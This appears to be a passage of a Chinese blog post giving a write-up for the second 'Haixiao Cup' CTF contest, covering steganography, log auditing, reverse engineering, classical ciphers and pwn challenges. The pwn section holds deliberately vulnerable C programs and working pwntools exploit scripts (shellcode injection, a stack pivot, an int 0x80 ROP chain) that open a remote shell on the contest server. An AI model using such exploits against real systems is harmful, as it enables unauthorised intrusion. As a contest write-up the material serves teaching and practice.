+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>图片隐写术</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>难度</strong></p>
+<p>​    ★</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p>binwalk分离,或者手工分离</p>
+<pre><code>binwalk -e 666.jpg</code></pre><ul>
+<li><strong><em>flag</em></strong></li>
+</ul>
+<pre><code>flag{WW91IGxvb2sgc2VyaW91cywgbGlrZSBDYWkgWHVrdW4u}</code></pre><hr>
+<h4 id="抓黑客"><a href="#抓黑客" class="headerlink" title="抓黑客"></a>抓黑客</h4><ul>
+<li><p><strong>题目描述</strong>：</p>
+<p>某学校服务器遭受到黑客入侵，管理员及时保留了服务器日志，已知黑客在服务器增加了一个root权限的用户，请你通过日志审计找出该用户第一次登陆的用户名、时间和ip，flag格式：</p>
+<p>用户名+时间+ip</p>
+<p>如:xiaoming+12:00+127.0.0.1</p>
+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>日志审计</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>难度</strong></p>
+<p>​    ★</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p>直接搜索“Accepted  ”即可找出登陆成功的用户信息：</p>
+<pre><code>grep &quot;Accepted &quot; auth.log | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></pre><ul>
+<li><strong><em>flag</em></strong></li>
+</ul>
+<pre><code>  mysq1+10:34:30+172.16.5.143</code></pre><hr>
+<h4 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>小明女神给他发了个文件，他却不知道如何打开你能帮助他吗？</p>
+</li>
+<li><p><strong>考点</strong></p>
+<pre><code>- zip伪加密
+- PNG高度隐藏</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<pre><code>★★☆</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>解题思路</strong></p>
+<p>解除伪加密，爆破高度</p>
+</li>
+</ul>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="Baby-reverse"><a href="#Baby-reverse" class="headerlink" title="Baby reverse"></a>Baby reverse</h4><ul>
+<li><strong>题目描述</strong></li>
+</ul>
+<ul>
+<li><p><strong>考点</strong></p>
+<pre><code>- IDA操作</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<p>​    ☆</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-fa8065abde7d9b40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>利用ida的字符串搜索功能找出flag</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-f5a7141ceb72f742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<hr>
+<p><strong><em>flag</em></strong></p>
+<pre><code>flag{reverse_is_easy}</code></pre><h4 id="Easy-reverse"><a href="#Easy-reverse" class="headerlink" title="Easy reverse"></a>Easy reverse</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>​    简单的运算</p>
+</li>
+<li><p><strong>考点</strong></p>
+<pre><code>- ida反编译的使用</code></pre><ul>
+<li>简单的算法逆向</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<pre><code>★</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-5da98a549a598124.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>主要算法，将输入的字符串异或0xC在加1</p>
+<p>解密脚本:</p>
+<pre><code>key = &quot;kanlxvdzTljyTfyTeuor&quot;
+flag=&quot;&quot;
+for i in key:
+    flag += chr((ord(i)-1)^0xC)
+print flag    </code></pre><p><img src="https://upload-images.jianshu.io/upload_images/18296851-9eb3e0b5d7383593.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<h4 id="霸王别姬"><a href="#霸王别姬" class="headerlink" title="霸王别姬"></a>霸王别姬</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>小明要煮个鳖顿乌鸡汤，不知道壳怎么脱</p>
+</li>
+<li><p><strong>考点</strong></p>
+<pre><code>- 脱壳</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<pre><code>★★</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-04bbe8ab8d4b9df8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-5821b27b933bf33c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-77ff363733f24f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>加壳后的文件函数和逻辑都被隐藏</p>
+<p>考点:识辨upx加壳，并且手动或工具脱掉upx加壳</p>
+<h6 id="解法一-工具脱壳"><a href="#解法一-工具脱壳" class="headerlink" title="解法一 工具脱壳"></a>解法一 工具脱壳</h6><p><img src="https://upload-images.jianshu.io/upload_images/18296851-f325294d7567d609.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-a1a752da78c15615.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>脱壳后即可看到flag</p>
+<h6 id="解法二-ESP定律法"><a href="#解法二-ESP定律法" class="headerlink" title="解法二 ESP定律法"></a>解法二 ESP定律法</h6><p>OD载入</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-f54a4c8536dcc697.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>发现ESP突变</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-616ac3f9cabae0f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>右键esp,选择数据窗口跟随</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-07dd648345c5232b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>选择数据窗口的第一个数据，右键选择硬件访问，断下硬件断点，运行。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-0273733a1743d162.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>发现大跳转，即为进入OEP</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-d8acb2f0589e43fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>用OD自带的插件脱壳</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-1e9a2ee419633291.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>将脱壳后的文件放入ida中，虽然upx没有脱干净，但是可以看到程序的主要函数以及隐藏的flag</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-42e06fc8b1de92a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<hr>
+<h4 id="电竞选手"><a href="#电竞选手" class="headerlink" title="电竞选手"></a>电竞选手</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>听说CTF选手常用WASD？</p>
+</li>
+<li><p><strong>考点</strong></p>
+<pre><code>- 逆向</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<pre><code>★★★★</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p>将程序用ida载入查看逻辑</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-44987ccd12b4c976.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>发现关键的判断句，当两个函数返回为1时则输入值为flag，首先看sub_401350函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-68ebb4461b0934ed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>sub_40145A函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-1f3b123f126b50cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>迷宫</p>
+<pre><code>##....####
+##.##.###.
+##.##.###.
+...##.###.
+.####.....
+.####.#.##
+.####...##
+....######
+###.###+##
+###.....##</code></pre><p>走完迷宫到达+的位置即为flag</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/18296851-ee4a6991ac2931e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<hr>
+<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h4 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>恺撒将军使用了一种技术运筹帷幄，指挥千里将士决胜千里。</p>
+<p>敌军正好截获了一串密文:<code>]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@</code></p>
+<p>offset: 3</p>
+</li>
+<li><p><strong>考点</strong></p>
+<pre><code>- 凯撒密码
+- base64解码</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<pre><code>★★</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>解题思路</strong></p>
+<p>加密算法:将给定的flag中的每个字符后移3位，并将偏移后的字符串base64编码</p>
+<p>加密脚本:</p>
+<pre><code class="python">flag = &quot;flag{crypto_is_hxb_so_eAsy0}&quot;
+
+result = flag.encode(&quot;base64&quot;)
+
+print result
+
+encode_flag = &quot;&quot;
+
+for i in result:
+    encode_flag += chr((ord(i)+3)%128)
+
+print encode_flag</code></pre>
+<p>解密脚本:</p>
+<pre><code class="python">result=&quot;]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;
+
+flag=&quot;&quot;
+
+for i in result:
+    flag += chr(ord(i)-3)
+
+print flag.decode(&quot;base64&quot;)</code></pre>
+</li>
+</ul>
+<h4 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>小明家菜园要建栅栏，请教了他心爱的女神，女神给了这么点提示，他却看不懂，你能帮助他吗？：</p>
+<p>f_tnluz_aghggeao{t_oy_ldoia}</p>
+</li>
+<li><p><strong>考点</strong></p>
+<pre><code>- 栅栏密码</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<pre><code>★★</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>解题思路</strong></p>
+<p>由于栅栏数较小，因此不给出栅栏数提示，可以用网上的栅栏密码解密或手写脚本爆破栅栏数解密</p>
+<p>加密脚本:</p>
+</li>
+</ul>
+<pre><code>flag = &quot;flag{yo_uget_itzha_lan_good}&quot;
+
+#flag{yo _uget_i tzha_la n_good}
+
+k = 7 
+
+flag {yo_ uget _itz ha_l an_g ood}
+
+f_tn
+
+encode_flag=&quot;&quot;
+
+
+
+for i in range(7):
+    for j in range(4):
+        encode_flag += flag[j*7+i]
+
+print encode_flag</code></pre><p>​    解密脚本:</p>
+<pre><code>
+encode_flag = &quot;f_tnluz_aghggeao{t_oy_ldoia}&quot;
+
+for k in range(1,29):
+    flag=&quot;&quot;
+    num = 28/k
+    for i in range(k):
+        for j in range(num):
+            flag += encode_flag[j*k+i]
+    if &quot;flag&quot; in flag:
+        print &quot;k:&quot;+str(28/k)+&quot;\n&quot;+&quot;flag:\n&quot;+flag+&quot;\n&quot;
+</code></pre><h4 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h4><ul>
+<li><p>描述：</p>
+<p>我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码：</p>
+</li>
+</ul>
+<pre><code>密文：
+jivsyisgmlirgbggvuocevsivnsoevszotfloymivnmozwgitmbyfevtgugvffecgmflgtglimbggvjgmmuocevsivnijofcotgsoevsklgvflgkotjnkimmfejjhohyjifgnbwlyvfgtsiflgtgtmmcijjfeslfjwqvefstoyhmngrgjohgnflgetokvhiffgtvmozmhggulevnghgvngvfozgiuloflgtmocgjivsyisggdhgtfmbgjegrgflifwgitmisoklgvflgkotjnlinxymfzergfofgvcejjeovhgohjgflgwmhoqghgtlihmjivsyisgmbgfkggvflgcmoovizfgtkitnmcivwozflomghgohjgmfitfgnmgffjevsnokvfobguocgzitcgtmivnflgetjivsyisgmfoobguicgcotgmgffjgnivnzgkgtevvycbgtevtgugvfugvfytegmftingevnymfteijemifeovflgngrgjohcgvfozflgvifeovmfifgivnflgmhtginozyvergtmijuochyjmotwgnyuifeovgmhgueijjwsjobijemifeovivnbgffgtuoccyveuifeovmevflghimfzgknguingmijjlirguiymgncivwjivsyisgmfonemihhgitivnnocevivfjivsyisgmmyulimgvsjemlmhivemlivnulevgmgitgevutgimevsjwfiqevsorgtifhtgmgvfflgkotjnlimiboyfjivsyisgmflgnemftebyfeovozflgmgjivsyisgmemlysgjwyvgrgvflgsgvgtijtyjgemflifcejnpovgmlirgtgjifergjwzgkjivsyisgmozfgvmhoqgvbwcivwhgohjgklejglofkgfpovgmlirgjofmozfgvmhoqgvbwmcijjvycbgtmgytohglimovjwitoyvnjivsyisgmflgicgteuimiboyfizteuiivnimeiivnflghiuezeuhgtlihmozkleulhihyivgksyevgiijovgiuuoyvfmzotkgjjorgtflgcgneivvycbgtozmhgiqgtmemcgtgkleulfliflijzflgkotjnmjivsyisgmitgmhoqgvbwzgkgthgohjgflivflifijtginwkgjjorgtozflgfofijozjivsyisgmitgujomgfogdfevufeovkeflovjwizgkgjngtjwmhgiqgtmjgzfheuqiftivnocbymyyevuicgtoovgeslftgcievevsmhgiqgtmuleihivguoevcgdeuojehivihiulgevflgyvefgnmfifgmfkootfltggotkinxesyeviymftijeiovgkefliaygmfeovcitqvovgozflgmgmggcmfolirgcyululivugozmytrerij
+明文：
+Languages have been coming and going for thousands of years, but in recent times there has been less coming and a lot more going. When the world was still populated by hunter-gatherers，small，tightly knit(联系)groups developed their own patterns of speech independent of each other. Some language experts believe that 10,000 years ago, when the world had just five to ten million people, they spoke perhaps 12, 000 languages between them.Soon afterwards, many of those people started settling down to become farmers, and their languages too became more settled and fewer in number. In recent centuries, trade, industrialisation, the development of the nation-state and the spread of universal compulsory education, especially globalisation and better communications in the past few decades, all have caused many languages to disappear, and dominant languages such as English，Spanish and Chinese are increasingly taking over.At present, the world has about 6, 800 languages. The distribution of these languages is hugely uneven. The general rule is that mild zones have relatively few languages, often spoken by many people, while hot wet zones have lots, often spoken by small numbers. Europe has only around 200 languages; the Americas about 1, 000; Africa 2, 400; and Asia and the Pacific perhaps 3,200, of which Papua New Guinea alone accounts for well over 800.The median number(中位数) of speakers is mere 6,000, which that half the world&#39;s languages are spoken by fewer people than that.Already well over 400 of the total of 6, 800 languages are close to extinction (消亡), with only a few elderly speakers left. Pick, at random, Busuu in Cameroon （eight remaining speakers), Chiapaneco in Mexico (150), Lipan Apache in the United States (two or three) or Wadjigu in Australia (one, with a question-mark): none of these seems to have much chance of survival</code></pre><p>待解密文：</p>
+<pre><code>givfome</code></pre><ul>
+<li><p>解题过程</p>
+<ul>
+<li><p>进行字频统计得出如下结果</p>
+<pre><code>e =&gt;g
+a =&gt;i
+n =&gt;v
+t =&gt;f
+o =&gt;o
+s =&gt;m
+i =&gt;e
+r =&gt;j
+l =&gt;t
+h =&gt;l
+u =&gt;y
+d =&gt;s
+g =&gt;h
+p =&gt;n
+c =&gt;u
+m =&gt;c
+f =&gt;z
+w =&gt;k
+y =&gt;b
+v =&gt;w
+k =&gt;r
+c =&gt;q
+p =&gt;d
+t =&gt;p
+x =&gt;x
+j =a</code></pre></li>
+</ul>
+</li>
+<li><p>加密脚本</p>
+</li>
+</ul>
+<pre><code class="python">table = [&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;]
+s = &quot;eantosi&quot;
+m = &quot;&quot;
+for i in s:
+    k=0
+    for j in table:
+        i = i.lower()
+        if j == i:
+            l =(19*k+18)%26    
+            m = m + table[l]
+            break
+        else:
+            k = k+1    
+print(m)</code></pre>
+<p><strong><em>flag</em></strong></p>
+<pre><code>flag{eantosi}</code></pre><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>nc 139.199.10.70 10003</p>
+</li>
+<li><p><strong>考点</strong></p>
+<pre><code>- shellcode</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<pre><code>★★</code></pre></li>
+</ul>
+<hr>
+<ul>
+<li>题目源码</li>
+</ul>
+<pre><code class="C">#include &lt;stdio.h&gt;
+  #include &lt;unistd.h&gt;
+
+  int main()
+  {
+      setbuf(stdin, 0);
+      setbuf(stdout, 0);
+      setbuf(stderr, 0);
+      printf(&quot;欢迎参加海啸杯?\n&quot;);
+      printf(&quot;你听说过shellcode嘛?\n&quot;);
+      printf(&quot;input:\n&quot;);
+      read(0, shellcode, 1023);
+      (*(void (*)()) shellcode)();
+  }
+  #flag{7aa4aa9d-bb79-48e8-860a-266cf870a8ff}</code></pre>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p>直接输入一段字符，并且作为函数调用这段字符，由于题目保护全关，因此输入一段shellcode即可获得shell</p>
+<p>解题脚本:</p>
+<pre><code>from pwn import *
+
+#sh = process(&quot;./shellcode&quot;)
+
+sh = remote(&quot;139.199.10.70&quot;,10003)
+
+shellcode = asm(shellcraft.sh()) #输入一段shellcode
+
+sh.sendline(shellcode)
+
+sh.interactive()
+</code></pre><p><strong><em>flag</em></strong></p>
+<pre><code>flag{7aa4aa9d-bb79-48e8-860a-266cf870a8ff}</code></pre><hr>
+<h4 id="simple-stackoverflow"><a href="#simple-stackoverflow" class="headerlink" title="simple_stackoverflow"></a>simple_stackoverflow</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>nc 139.199.10.70 10004</p>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>shellcode</li>
+<li>栈转移</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<p>★★★</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li>题目源码</li>
+</ul>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int overflow()
+{
+    char buf[24];
+    read(0, buf, 1023);
+    return 0;
+}
+
+int main()
+{
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    setbuf(stderr, 0);
+    overflow();
+}
+
+#flag{5fa84896-6696-4d3f-a85c-41d0de6a5515}</code></pre>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p>题目一样保护全关，但是输入shellcode后却不知道shellcode的返回地址，因此需要将栈转移，将栈转移到.bss段写下shellcode并返回到.bss段调用shellcode得到shell</p>
+<p>解题脚本:</p>
+<pre><code class="python">from pwn import *
+
+#sh = process(&quot;./simple_stackoverflow2&quot;)
+
+sh = remote(&quot;139.199.10.70&quot;,10004)
+
+bss_address =  0x804a040
+
+shellcode = asm(shellcraft.sh())
+
+payload = &quot;a&quot;*(0x20+4)  + p32(0x08048390)+p32(bss_address) + p32(0) + p32(bss_address) + p32(len(shellcode)) 
+
+sh.sendline(payload)
+
+#time.sleep(1)
+
+sh.send(shellcode)
+
+sh.interactive()
+</code></pre>
+<p><strong><em>flag</em></strong></p>
+<pre><code>flag{5fa84896-6696-4d3f-a85c-41d0de6a5515}</code></pre><hr>
+<h4 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h4><ul>
+<li><p><strong>题目描述</strong></p>
+<p>nc 139.199.10.70 10007</p>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>ROP</li>
+<li>系统调用好 int0x80</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>难度</strong></p>
+<p>★★★★</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li>题目源码</li>
+</ul>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+char *shell = &quot;/bin/sh&quot;;
+
+int main(void)
+{
+    setvbuf(stdout, 0LL, 2, 0LL);
+    setvbuf(stdin, 0LL, 1, 0LL);
+
+    char buf[100];
+
+    printf(&quot;This time, no system() and NO SHELLCODE!!!\n&quot;);
+    printf(&quot;What do you plan to do?\n&quot;);
+    gets(buf);
+
+    return 0;
+}
+</code></pre>
+<p><strong>解题思路</strong></p>
+<p>题目没有system的地址，但通过ROPgadget可以知道eax,ebx,edx,ecx与int 0x80的地址，因此选择使用系统调用int 0x80 相当于执行execuve(“/bin/sh”)获取shell 此时eax的值为0xb,ebx的值为”/bin/sh”的地址，ecx,edx的值为0</p>
+<p>解题脚本:</p>
+<pre><code class="python">from pwn import *
+
+#sh = process(&quot;./rop&quot;)
+
+sh = remote(&quot;139.199.10.70&quot;,10007)
+
+ppp_dcb_address = 0x0806eb90
+
+p_eax = 0x080bb196 
+
+bin_sh_address = 0x080be408
+
+int_0x80_address = 0x08049421
+
+payload = &#39;a&#39;*(112) + p32(p_eax) + p32(0xb) + p32(ppp_dcb_address) + p32(0)+ p32(0) + p32(bin_sh_address) + p32(int_0x80_address)
+
+time.sleep(4)
+
+sh.sendline(payload)
+
+sh.interactive()
+
+#flag{48cddff6-994e-409e-bb27-7b7366454253}</code></pre>
+<ul>
+<li><strong><em>flag</em></strong></li>
+</ul>
+<pre><code>flag{48cddff6-994e-409e-bb27-7b7366454253}</code></pre>
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-10-20T02:21:31.051Z" itemprop="datePublished">2019-10-20</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="第二届海啸杯题目" data-title="第二届海啸杯网络安全挑战赛write up" data-url="http://www.plasf.cn/2019/10/20/第二届海啸杯题目/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
